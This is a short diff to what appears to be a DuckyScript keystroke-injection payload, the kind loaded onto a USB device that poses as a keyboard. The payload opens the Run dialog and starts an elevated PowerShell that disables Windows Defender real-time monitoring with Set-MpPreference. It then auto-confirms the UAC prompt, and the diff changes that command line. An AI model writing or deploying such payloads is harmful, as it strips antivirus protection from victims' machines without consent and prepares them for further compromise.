@@ -16,7 +16,7 @@ DELAY 1000
 GUI r
 DELAY 200
 REM Start an elevated powershell instance which will disable Windows Defender.
-STRING start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs
+STRING powershell start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs
 ENTER
 ALT y
 ```
